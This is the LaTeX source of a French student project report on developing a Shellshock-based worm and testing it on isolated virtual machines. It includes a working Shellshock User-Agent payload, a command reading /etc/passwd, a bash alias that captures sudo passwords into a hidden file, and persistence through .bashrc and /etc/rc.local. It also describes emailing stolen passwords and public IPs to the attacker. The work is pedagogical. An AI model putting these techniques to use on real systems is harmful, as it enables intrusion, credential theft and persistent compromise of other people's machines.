\documentclass[]{projet-M1}

\newcommand{\myname}{Mathieu Valois}
\newcommand{\mysupervisor}{M. Alain Bretto}
\newcommand{\myreviewer}{None}
\newcommand{\mydate}{Année 2014-2015}
\newcommand{\mytitle}{Développement d'un ver informatique grâce à une faille du système et étude de sa propagation au sein d'un réseau de machines}
\newcommand{\mypicture}{shellshock}
\newcommand{\myabstract}{Ce projet consiste en la réalisation d'un ver informatique, capable de se déplacer dans un réseau de manière autonome,
rampant de machine en machine grâce à une \gls{faille} des systèmes qu'il infecte. Une fois réalisé, il faudra étudier sa progression dans un réseau depuis une première machine, et éventuellement améliorer ses capacités de propagation et de furtivité en conséquence. Par ailleurs, on pourra aussi
le doter d'une \gls{charge virale} et l'améliorer.
}
\newcommand{\myquote}{``It's not a bug, it's a feature'' 

- GNU about \gls{Shellshock} bug}

\loadglsentries{glossary.glo}
\makeglossaries
\begin{document}
\renewcommand{\labelitemi}{$\vcenter{\hbox{\tiny$\bullet$}}$}
\makemytitle{}
\tableofcontents
\newpage
\section{Introduction}
\subsection{Aaaah, un ver ! Quelle horreur !}
En informatique, on appelle un ver, un programme capable de s'auto-répliquer. Contrairement aux virus, il ne possède pas de \gls{programme hote}, cela implique qu'il doive se déplacer seul. En effet, le virus lui, se déplace avec le programme qu'il a infecté (sur une clé USB, par e-mail, ...), alors que le ver doit progresser de machine en machine seul. C'est pour ça que les vers utilisent en général une \gls{faille} du système. 

On appelle \gls{charge virale} d'un ver ou virus le but final de ce programme. Par exemple : surveiller le système, détruire des fichiers, attaquer un serveur, envoyer des milliers d'e-mails ...

Généralement, un ver se décompose en 3 fonctions distinctes : 
\begin{itemize}
\item une fonction de propagation, permettant d'infecter un nouveau système
\item une fonction de persistance qui permet au virus de résister aux redémarrages de la machine
\item une fonction d'attaque exécutant sa \gls{charge virale}
\end{itemize}

\subsection{Avantages/inconvénients face au virus}
De part sa nature, le ver informatique possède plusieurs avantages mais aussi des inconvénients face au virus. 
Premièrement, le fait de ne pas requérir de \gls{programme hote} lui permet de se déplacer à une vitesse bien supérieure au virus pour deux raisons : 
\begin{itemize}
\item il n'attend pas pour aller de machine en machine
\item il est lancé directement dès qu'il arrive sur une nouvelle machine cible
\end{itemize}

Deuxièmement, il est généralement plus furtif, car il s'introduit de manière active sur un système : aucune action d'un utilisateur n'est nécessaire. Cela implique qu'un utilisateur même averti \footnote{qui lui passerait un coup d'antivirus sur un fichier suspect} aurait du mal à détecter la présence d'un nouveau ver sur son système. 

Cependant, il réside des inconvénients de taille de part sa manière d'agir : 
\begin{itemize}
\item une fois les \glspl{faille} qu'il utilise bouchées, il ne peut plus se propager sur un système patché \footnote{dont la faille a été corrigée}, il est donc très dépendant des \glspl{faille} qu'il exploite
\item il suffit de couper le réseau pour arrêter sa propagation
\end{itemize}

\subsection{Court historique}
Le premier ver informatique recensé est le ver \emph{Morris}, apparu en 1988. Il utilisait 2 \glspl{faille} présentes dans les systèmes \gls{UNIX} de l'époque, une dans \emph{sendmail} \footnote{la commande \gls{UNIX} permettant d'envoyer un e-mail} et l'autre dans \emph{fingerd}\footnote{commande qui permettait d'obtenir des informations sur la personne derrière une adresse mail}. On estime à 6000 (soit environ 10\% du réseau Internet de l'époque) le nombre de machines infectées par ce ver.

Depuis qu'Internet existe, beaucoup de vers informatiques ont vu le jour et ils sont même devenus une pratique courante d'attaques informatiques à des fins militaires\footnote{Stuxnet (découvert en 2010), ver destiné à espionner les réacteurs nucléaires de Siemens en Iran, endommageait les centrifugeuses en augmentant et en baissant leur vitesse sans que les techniciens s'en aperçoivent }.

Des formes de vers utilisant la faille présentée ci-dessous ont été entre-aperçues quelques jours après la publication de ladite faille. Ce afin de dire que le ver ici présenté n'est en rien révolutionnaire, mais un des objectifs principaux auquel je tiens est la documentation et le retour d'expérience. Contrairement à ces formes de vers, mon projet se veut pédagogique, et ce rapport constitue une démarche classique dans le développement d'un tel programme. 

\section{Contenu du projet}
\subsection{Description détaillée}
Dans ce projet, je développerai un ver informatique, fondé sur une \gls{faille} du système. Le langage de programmation utilisé m'est libre de choix, ainsi que la/les \gls{faille}(s) à exploiter (le type de système aussi, mais il est lié aux \glspl{faille}). Je réaliserai les 3 fonctions essentielles d'un ver, c'est à dire la fonction de propagation, celle de persistance ainsi que la fonction d'attaque. Je veillerai à ce que le ver reste le plus furtif possible sur les systèmes infectés afin de pouvoir se propager sur un maximum de machines.

Par la suite, il faudra l'essayer sur un réseau (coupé du monde, l'Internet n'est pas un réseau pour y tester de tels programmes). Des machines virtuelles feront l'affaire, en espérant qu'elles soient assez nombreuses (idéalement un parc de 40/50 machines, mais une dizaine suffiront dans un premier temps).

Il faudra après cela essayer d'améliorer ce ver en fonction des résultats observés sur le réseau testé. Si la propagation et la furtivité sont suffisamment satisfaisantes, alors on pourra améliorer les capacités de la \gls{charge virale} afin d'étendre les privilèges par exemple. Ou bien de surveiller le système de manière discrète pour soutirer des informations sur ses utilisateurs comme des mots de passe, informations personnelles, ...

\subsection{Exemples d'utilisations}
Voici quelques exemples qui pourraient découler de ce projet : 
\begin{itemize}
\item puisqu'un ver n'est par définition pas obligatoirement malveillant, pourquoi ne pas s'en servir de façon bénéfique ? Par exemple, on pourrait se servir de ce ver pour se propager au sein des systèmes vulnérables à la \gls{faille} qu'il utilise afin de prévenir les administrateurs qu'une \gls{faille} est présente et qu'il faut mettre à jour le système pour la  corriger.
\item si le ver est capable d'étendre ses privilèges \footnote{vers des privilèges root}, alors on pourrait s'en servir pour faire la même chose que précédemment tout en patchant directement la \gls{faille} sans prévenir l'utilisateur immédiatement. En entreprise par exemple, au lieu de mettre à jour les machines une à une (ce qui peu être lent et exhaustif), on pourrait lâcher un tel ver à condition qu'il ait été analysé par l'administrateur réseau de l'entreprise auparavant (et dans l'idéal, certifié par la communauté).
\item à des fins statistiques, on peut s'en servir pour comptabiliser le nombre de machines vulnérables aux \glspl{faille} qu'il exploite sur l'Internet. Une fois le ver implanté sur une telle machine vulnérable, celui-ci envoie ainsi sur un serveur prédéfini l'information indiquant que le système est bien vulnérable. Il effectue cette opération de façon anonyme si le programmeur est bienveillant, dans le cas contraire il envoie le maximum d'informations relatives au système infecté.  
\item et bien sûr, dès lors l'usage malveillant du ver, le pirate peut ainsi effectuer différentes attaques : infiltration de systèmes sans autorisation, surveillance, modification, \gls{keylogger}, \gls{backdoor}, ...
\end{itemize}

Ces exemples sont donnés à titre indicatif. Cependant, la terreur que propage le terme "ver" rend ces utilisations difficiles à mettre en œuvre. Car pour la plupart des personnes, les mots "virus" et "ver" sont toujours péjoratifs, alors que la définition ne parle en aucun cas d'un quelconque but malveillant. Il est donc difficile de lancer un ver avec une bonne intention sans être perçu comme malfaisant\footnote{peut-être que la législation de certains états est différente de celle de la France. Ici une fois infiltré dans le système le programmeur est coupable}.

\subsection{Contexte}
Étant plutôt intéressé par la sécurité informatique (système et réseau) dans son ensemble, je suis assez à la page au niveau des nouvelles \glspl{faille} de sécurité découvertes et publiées. Il s'avère qu'au moment où nous devions choisir nos projets, une \gls{faille} venait tout juste d’être dévoilée, mettant en péril beaucoup de machines tournant sous un système type \gls{UNIX}. Je me suis donc mis au travail en cherchant un moyen rapide d'exploiter cette \gls{faille}, et c'est là que j'ai mis au point le prototype d'un ver. M. Alain Bretto avait fait quelques propositions concernant des projets qu'il souhaitait réaliser avec ces étudiants, et la conception d'un ver en faisait partie. J'ai donc sauté sur l'occasion.
De plus, j'ai lu quelques ouvrages \cite{virus:filiol} concernant les virus et les vers, ce qui m'a permis d'en savoir suffisamment afin d'en élaborer. 

\subsection{Solution}
Premièrement, ce ver sera écrit en Perl. Tout simplement parce que Perl est un langage facile d'accès\footnote{il faut entendre "à prototypage rapide". Quand on connaît Python, on n'est pas perdu avec Perl}, très utilisé pour faire de la configuration système \gls{UNIX}, et le top du top, il est présent sur la plus grande partie des distributions \gls{UNIX}. Car il faut quand même que le système cible soit capable d'exécuter le ver ! Cela nous offre donc une quasi certitude que le ver ne sera pas bloqué sur un système parce que ce dernier n'est pas en mesure de l'exécuter.
\subsubsection{La faille}
La première \gls{faille} utilisée par le ver que je vais développer s'appelle \Gls{Shellshock}. \gls{Shellshock} est une \gls{faille} découverte le 24 septembre 2014, touchant le \gls{shell} \gls{bash} des systèmes \gls{UNIX}. D'après certains experts, il s'agit de l'une des plus grosses \glspl{faille} connues\footnote{au sens où celle ci peut faire le plus de dégâts} sur de tels systèmes jamais trouvée. D'après Brian Fox, le créateur de Bash, la faille serait présente depuis la version 1.03 publiée en 1989\footnote{\url{https://en.wikipedia.org/wiki/Shellshock_(software_bug)}}.
Voici quelques détails techniques : \gls{bash} permet d'exporter des fonctions par une variable d'environnement à des processus fils. 

Par exemple \cite{Shellshock:linuxfr}: 
\begin{lstlisting}
$ env mafonction='() { echo "bonjour vous"; }' bash -c 'mafonction;'
\end{lstlisting}
Jusqu'ici rien d'anormal : on définit juste la fonction "mafonction" puis on demande à un processus fils de l'exécuter. Cependant, si l'on place du code \textbf{APRÈS} la fin de la fonction : 
\begin{lstlisting}
$ env mafonction='() { echo "bonjour vous"; }; _echo "voici shellshock"_ ' bash -c "mafonction;"
\end{lstlisting}
retournera 
\begin{lstlisting}
voici shellshock
bonjour vous
\end{lstlisting}
Ici, lorsque le processus définit la fonction \og mafonction\fg \footnote{le fils n'a même pas besoin d'exécuter la fonction, le code situé après est exécuté quoi que le fils fasse}, il ne se contente pas d'exécuter \og echo `` bonjour vous''\fg mais exécute aussi \og echo ``voici shellshock''\fg (le code souligné dans l'exemple). On remarque que le délimiteur \og '\fg n'est pas placé à la fin de la fonction mais bien après le code injecté.

On peut dès à présent imaginer les possibilités qu'offre cette \gls{faille}. Par exemple, il est possible de récupérer les \gls{hashs} des mots de passe des utilisateurs du système, grâce à cette commande : 
\begin{lstlisting}
$ env mafonction='() { :; }; cat /etc/passwd' bash -c "echo"
\end{lstlisting}
On peut supposer que l'attaquant envoie la réponse de cette commande sur un serveur où il possède les droits afin de la récupérer. 

De plus, \Gls{bash} étant très pratique pour faire de l'administration système, beaucoup d'utilisateurs s'en sont servis pour écrire des scripts web (\gls{CGI}). Il est alors possible via des requêtes bien précises, d’exécuter du code sur des machines distantes sans aucun privilège sur celles-ci. Entre autres, via les \label{http-head}\gls{entetes HTTP}, il est possible d'y écrire le code source d'un programme afin qu'il se copie dans un fichier sur la machine distante. Nous avons là un ver.

\subsubsection{Target acquired, et maintenant ?}
Jusque là, nous sommes capables d'infecter une nouvelle machine à condition qu'elle soit vulnérable. Cependant, si elle redémarre, le ver sera tué et ne se relancera pas au redémarrage. Ce qui est gênant car nous souhaitons que le ver persiste et survive aux redémarrages. 

Dans un premier temps, nous n'aurons accès qu'à très peu de fichiers dans l'arborescence du système, car nous aurons les droits de l'utilisateur qui exécute le script \gls{CGI}\footnote{en général : "www-data" pour les Debian et "apache" pour les Red-hat} grâce auquel le ver à infecté la machine. Il nous faudra donc trouver un moyen d’être relancé par un utilisateur non root de la machine, ou au pire des cas, par www-data \footnote{l'utilisateur qui exécute le \gls{CGI}} lui-même. 

Dans un second temps, si les \glspl{droit root} sont obtenus, alors il est plus facile de résister aux redémarrages. Le ver pourrait par exemple écrire dans le fichier rc.local \footnote{/etc/rc.local : fichier exécuté au démarrage du système avec les \glspl{droit root}} ou mieux, dans le dossier init.d \footnote{/etc/init.d/ : les programmes placés dans ce dossier sont exécutés au démarrage du système, et sont des services, c'est à dire des programmes qui tournent en tâche de fond} en tant que service afin d'être plus discret. On veillera à donner un nom qui ressemble à celui d'un service commun aux systèmes \gls{UNIX} afin de ne pas éveiller les soupçons.

\subsubsection{Méchant ver !}
Notre ver résiste aux redémarrages ! Dans l'idéal, il est furtif et ressemble à un processus légitime du système. On peut désormais essayer d'appliquer une \gls{charge virale} à notre création ! 
C'est ici que l'imagination entre en jeu, nous pourrions : 
\begin{itemize}
\item espionner les utilisateurs du système en surveillant les dossiers de leurs dossiers ``home''\footnote{dossier personnel}
\item tenter de récupérer les mots de passe des utilisateurs en surchargeant la commande sudo\footnote{commande permettant d'exécuter la commande qui suit avec des \glspl{droit root}}
\item altérer le système (supprimer des fichiers ...)
\item et plein d'autres choses selon l'imagination
\end{itemize}

\subsubsection{Ah, petits problèmes ...}
On va me dire, si ce ne sont que de petits problèmes, c'est pas très grave alors ... Eh bien quand même ! 
Effectivement, quelques problèmes apparaissent : 
\begin{itemize}
\item exploiter la \gls{faille} \gls{Shellshock} nécessite l'accès à un script \gls{CGI} exécuté avec \gls{bash} ... Rien ne nous dit que toutes les pages d'un serveur web sont générées avec du \gls{CGI}+\gls{bash} !
\item et Windows dans tout ça ? Quand est-ce qu'on l'attaque ?
\end{itemize}
Bon pour Windows, on va laisser tomber\footnote{vous allez rire, mais \gls{bash} existe pour Windows et il s'avère que certains administrateurs web s'en servent pour leur Windows Server, donc techniquement, il est possible de s'attaquer à ce type de machine ...} ... 

Par contre, il est possible de trouver une liste des chemins d'accès les plus courants à des scripts \gls{CGI} à cette adresse : \url{https://21102894.users.info.unicaen.fr/commoncgipaths.txt}\footnote{récupéré depuis \url{https://shellshock.detectify.com/}}


\section{Calendrier prévisionnel}
\begin{tabular}{| l || l |}
	\hline
	Date & fonctions disponibles  \\ \hhline{|=||=|}
	30 nov. & le ver est capable d'infecter une nouvelle machine vulnérable en sachant son adresse IP \\ & et le chemin d'un script \gls{CGI}+\gls{bash} 	\\ \hline
	15 dec. & il peut infecter un grand nombre de machines en récupérant une IP depuis un fichier \\ & qui peut être généré aléatoirement ou avec une liste de cibles définies par l'attaquant \\
	& et en itérant sur la liste des chemins les plus courant aux \gls{CGI}\\ \hline
	31 dec. & il est capable de résister aux redémarrages de la machine grâce à des droits non root \\ \hline
	20 jan. & le ver parvient à capturer des mots de passe utilisateurs en surchargeant la  \\ & commande sudo \\ \hline
	10 fev. & avec des mots de passe utilisateurs ayant des \glspl{droit root}, le ver est capable de \\ & résister aux redémarrages avec des \glspl{droit root} \\ \hline
	25 fev. & désormais, il est capable d'obtenir des informations sur les utilisateurs  \\ & du système en les surveillant et d'acheminer les données sur un serveur distant \\ \hline
 \end{tabular}
Évidement, il est possible que le calendrier change au cours du temps, mais je vais essayer de m'y tenir au maximum.
\section{Ce qui fonctionne}
À cette heure, les 4 premières fonctionnalités sont implantées et fonctionnelles, c'est à dire : 
\begin{itemize}
\item infection d'une nouvelle machine grâce à son IP
\item infection d'une liste de cibles prédéfinies
\item résiste aux redémarrages sans privilèges root
\item capture les mots de passe utilisateur en surchargeant la commande sudo
\item persistance au redémarrage des machines infectées en conservant les droits root, afin de n'avoir plus aucun restriction sur l'ensemble du système
\item espionnage du système en acheminant les mots de passe récupérés par mail sur une adresse distante
\end{itemize}

\subsection{Infection d'une nouvelle machine}
Le ver contient une variable indiquant l'adresse IP de la machine à attaquer, ainsi qu'un chemin d'accès vers le script vulnérable à ShellShock. Il essaye donc de se connecter à la machine donnée et de télécharger la page indiquée par le chemin d'accès en utilisant un User-Agent qui exploite la faille (comme indiqué en fin de \ref{http-head}).
Exemple avec \gls{wget}: 
\begin{lstlisting}
wget http://example.com/cgi-vulnerable --header="User-Agent: () { :;}; $_ <commande_a_executer>"
\end{lstlisting} 
Si le script est vulnérable, alors le ver se verra copié sur la machine distante, et d'autres commandes supplémentaires seront envoyées à cette machine afin de réveiller le ver à distance.

\subsection{Infection de plusieurs machines}
Il est évident qu'une fois le ver capable d'infecter une machine, il n'est pas dur de l'adapter pour qu'il en infecte plusieurs. Le ver contient donc une liste d'adresses IP de machines distantes (ou locales) afin d'itérer sur celles-ci pour tenter de les infecter.
Mais ici, un problème se pose : qu'en est-il de la surinfection ? C'est à dire qu'une machine C déjà visitée par une instance du ver sur une machine A (que C soit vulnérable ou pas) sera revisitée par une autre instance du ver sur une machine B. Ceci pose un problème de discrétion\footnote{en réalité, le fait de ne pas être discret ne pose pas réellement de problèmes ici sachant que l'administrateur n'a pas fait les mises à jour du système, il ne doit donc pas être très présent sur la machine}. Il est envisageable si le temps le permet d'ajouter la fonctionnalité permettant de gérer la surinfection d'une machine déjà infectée par une autre instance du ver.

\subsection{Résister aux redémarrages}
Une fois le ver sur la machine distante, nous voudrions qu'il soit actif peu importe ce qu'il arrive à la machine. Cependant, tant que nous ne possédons par les droits root, il est difficile de résister aux redémarrages à coups sûrs. Nous allons donc nous contenter de relancer le ver quand nous le pouvons. 
Une manière de faire est d'écrire dans le .bashrc des utilisateurs du système. Ce fichier est chargé à chaque fois que l'utilisateur concerné ouvre un nouveau terminal par exemple\footnote{c'est le cas sur les systèmes dérivés de Debian, j'ignore concernant les autres}. Il suffit donc d'écrire un appel au ver dans ce fichier, soit au début, soit à la fin, et de rediriger toute sortie de la commande dans /dev/null afin de ne pas éveiller les soupçons. Encore un problème apparaît : comment écrire dans le .bashrc des utilisateurs si celui n'est pas inscriptible ? Et bien là, il faut prier pour une mauvaise configuration ou une mauvaise manipulation de l'utilisateur pour qu'il rende celui-ci inscriptible\footnote{à l'avenir il est possible d'imaginer écrire dans un dossier du \gls{path} de l'utilisateur et de remplacer une commande}.

Grâce à la fonctionnalité ci-dessous qui permet de capturer les mots de passe utilisateurs, le ver est capable, à condition que l'un des utilisateurs du système soit dans le groupe \textbf{sudo}, de se relancer au redémarrage de la machine infectée tout en conservant les droits root. Pour cela, il écrit dans le fichier \textbf{/etc/rc.local} la commande l'appelant (qui est simplement le chemin d'accès à ce fichier car il est exécutable), ce qui lui permet d'être exécuté à chaque démarrage de la machine avec des droits super-utilisateur. De cette manière, le ver n'a plus aucune restriction sur les droits d'accès à certaines parties sensibles du système.

Une petite difficulté cependant était apparue : le dossier dans lequel gît le ver et les fichiers dont il a besoin étant \textbf{/tmp}, celui ci est par défaut vidé à chaque démarrage. Cela peut s'arranger en définissant \textbf{TMPTIME=-1} dans le fichier \textbf{/etc/default/rcS} (que nous pouvons modifier grâce aux mots de passe capturés) auquel cas ce dossier n'est jamais vidé.

\subsection{Capturer des mots de passe utilisateur}
Afin de pouvoir obtenir des droits root sur le système, il nous faut obtenir les mots de passe utilisateur, en espérant qu'eux même possèdent les droits root. Ainsi, il sera possible pour le ver d'être relancé aux redémarrages quoi qu'il arrive (et aussi d'espionner le système). 

Pour ce faire, il nous faut encore une fois écrire dans le .bashrc en surchargeant la commande sudo, de cette manière : 
\begin{lstlisting}
capture(){
	echo -n "[sudo] password for $USER: " && 
	read -rs password && 
	echo "$password:$(whoami)" >> $sudoFile && 
	echo "$password" | /usr/bin/sudo -S "$@"
}
alias sudo=capture;
\end{lstlisting}

Ainsi, si sudo est lancé par l'utilisateur concerné, en réalité c'est cet alias qui sera appelé, capturant le mot de passe demandé et l'écrivant dans le fichier caché /tmp/.ssh-mOTc45gfXwPj/agent.1338. Et pour moins éveiller les soupçons, l'alias lance la véritable commande sudo à la fin. De cette manière, l'utilisateur n'y voit que du feu, car la commande réelle demandée par ce dernier ainsi que l'ensemble de ses arguments sont ensuite appelés afin de ne pas éveiller les soupçons. Un utilisateur régulier de GNU/Linux pourrait cependant remarquer que son mot de passe lui est demandé à chaque commande sudo, ce qui n'est pas normal car il existe un temps de quelques minutes pendant lequel la commande sudo ne demande pas le mot de passe.

Il est possible d'ajouter une amélioration à cette fonctionnalité en envoyant sur un serveur distant appartenant à l'attaquant, les mots de passe ainsi capturés. Cependant, cela pourrait trahir l'anonymat de cet attaquant. 

\subsection{Envoi des mots de passe à distance}
Une fois certains mots de passe capturés via la technique présentées ci-dessus, le ver compte sur le fait que la machine infectée dispose de la commande \textbf{/usr/sbin/sendmail} afin d'envoyer à l'adresse définie juste avant, la liste des mots de passe avec les utilisateurs correspondant, et en plus les adresses IPv4 et IPv6 publiques de la machine. Cela permet à l'attaquant de se connecter à distance via \textbf{SSH} avec les mots de passe qu'il a reçu. Pour connaître les adresses IP publiques de la machine, le ver fait un \textbf{wget} sur cette page \url{http://tnx.nl/ip} et récupère le contenu.

\subsection{Un concours de circonstances}
Vous me direz que pour arriver à infecter et prendre le contrôle total de la machine, cela relève d'un exploit que toutes ces conditions soient réunies. Malheureusement, ceci peut arriver et il n'est pas rare que lorsqu'une des ces mauvaises configurations est présente sur le système, d'autres le soient. Il n'est pas surréaliste d'espérer que si le système est vulnérable à ShellShock, nous pourrions aller plus loin que simplement envoyer le ver sur la machine.



\section{Conclusion}
On pourrait conclure en disant qu'un tel ver lâché sur le grand réseau qu'est l'Internet pourrait faire des ravages, mais à vrai dire, la plupart des serveurs vulnérables ont été mis à jour depuis. Cependant, il ne faut pas omettre le reste des machines qui tournent sur des systèmes type \gls{UNIX} et qui ne sont pas des serveurs : ordinateurs de poche\footnote{appelés par les médias "smartphones"}, routeurs, machin-box\footnote{la boite noire qui vous donne accès à Internet chez vous}, caméra-ip, et j'en passe. Le problème de ces appareils est qu'ils ne sont pas tous mis à jour régulièrement (cela dépend en grande partie de la bonne volonté du constructeur). Et la plupart du temps, ils sont connectés à Internet (et avoir une adresse IP privée ne suffit pas pour être caché).


\printglossaries


\bibliographystyle{plain}
\bibliography{mabiblio}


\end{document}

